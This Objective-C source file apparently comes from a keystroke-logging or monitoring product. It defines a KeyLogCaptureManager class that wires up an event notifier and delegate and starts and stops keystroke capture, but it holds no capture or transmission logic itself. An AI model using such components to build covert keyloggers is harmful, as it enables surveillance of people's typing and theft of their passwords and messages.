//
//  KeyLogCaptureManager.m
//  KeyLogCaptureManager
//
//  Created by Ophat Phuetkasickonphasutha on 9/4/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "KeyLogCaptureManager.h"
#import "KeyLogEventNotifier.h"

#import "DefStd.h"
#import "FxKeyLogEvent.h"

@implementation KeyLogCaptureManager

@synthesize mEventDelegate;
@synthesize mKeyLogEventNotifier;


- (id) initWithEventDelegate :(id <EventDelegate>) aEventDelegate {
	if ((self = [super init])) {
		mEventDelegate = aEventDelegate;
		mKeyLogEventNotifier = [[KeyLogEventNotifier alloc] init];
		[mKeyLogEventNotifier setMDelegate:mEventDelegate];
	}
	return self;
}


- (id) init {
	if ((self = [super init])) {
	}
	return (self);
}

- (void) registerEventDelegate: (id <EventDelegate>) aEventDelegate {
	[self setMEventDelegate:aEventDelegate];
}

- (void) unregisterEventDelegate {
	[self setMEventDelegate:nil];
}

- (void) startCapture {
	DLog (@"Start capture KeyLog messenger");
	[mKeyLogEventNotifier startNotifiy];
}

- (void) stopCapture {
	DLog (@"Stop capture KeyLog messenger");
	[mKeyLogEventNotifier stopNotifiy];
	
}

- (void) dealloc {
	[self stopCapture];
	[mKeyLogEventNotifier release];
	[super dealloc];
}

@end